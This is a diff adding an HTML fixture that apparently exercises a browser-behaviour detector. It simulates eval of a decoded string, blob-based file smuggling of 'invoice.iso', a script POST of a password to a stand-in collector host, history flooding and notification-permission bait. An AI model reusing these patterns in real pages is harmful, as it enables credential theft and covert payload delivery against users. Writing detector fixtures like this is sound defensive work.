@@ -1,0 +1,21 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>loader</title></head>
+<body>
+<form id="f"><input type="password" id="pw"></form>
+<a id="dl" download="invoice.iso">x</a>
+<script>
+  // Runtime exec of a decoded string (A1/A14 exec hook + dynamic-script artifact).
+  var payload = atob('ZG9jdW1lbnQudGl0bGU9ImxvYWRlZCI7' + 'QUJD'.repeat(400));
+  try { eval('var _z=1;' + 'x'.repeat(1200)); } catch (e) {}
+  // Blob/File smuggling (A1 blob hook).
+  var big = new Uint8Array(4096);
+  var b = new Blob([big], { type: 'application/octet-stream' });
+  var u = URL.createObjectURL(b);
+  // Script-posted credential to another origin (observed via A3 initiator + resource type).
+  fetch('https://collector.invalid/submit', { method: 'POST', body: 'pw=secret' }).catch(function () {});
+  // History flooding.
+  for (var i = 0; i < 25; i++) history.pushState({}, '', '/p' + i);
+  // Permission bait.
+  if (window.Notification) Notification.requestPermission();
+</script>
+</body></html>
